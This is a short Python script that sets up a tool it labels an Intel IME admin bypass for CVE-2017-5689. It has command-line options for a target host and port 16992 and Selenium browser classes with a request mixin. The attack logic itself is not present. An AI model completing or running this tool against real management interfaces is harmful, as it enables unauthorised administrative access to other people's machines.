from selenium.webdriver import Firefox, Chrome, Ie, Opera, Safari, PhantomJS, Android, Remote
from seleniumrequests.request import RequestMixin
import argparse
#OPTIONS!
global arguments

parser = argparse.ArgumentParser(description = 'Intel IME Admin Bypass Tool, \
                                                CVE-2017-5689')
parser.add_argument('--target',
                                 dest     =  'target',
                                 action   =  "store" ,
                                 default  =  "192.168.0.44" ,
                                 help     =  "Intel IME Server To Target \
                                             (http://192.168.0.44)" )
parser.add_argument('--port',
                                 dest     =  'port',
                                 action   =  "store" ,
                                 default  =  '16992' ,
                                 help     =  "Port for the IME Web UI \
                                             (numbers only please)" )
parser.add_argument('--browser',
                                 dest     =  'which_browser',
                                 action   =  "store" ,
                                 default  =  'firefox' ,
                                 help     =  "Browser to use (firefox,chrome)")

arguments = parser.parse_args()

class Firefox(Firefox, RequestMixin):
    pass


class Chrome(Chrome, RequestMixin):
    pass


class Ie(Ie, RequestMixin):
    pass


class Opera(Opera, RequestMixin):
    pass


class Safari(Safari, RequestMixin):
    pass


class PhantomJS(PhantomJS, RequestMixin):
    pass


class Android(Android, RequestMixin):
    pass


class Remote(Remote, RequestMixin):
    pass
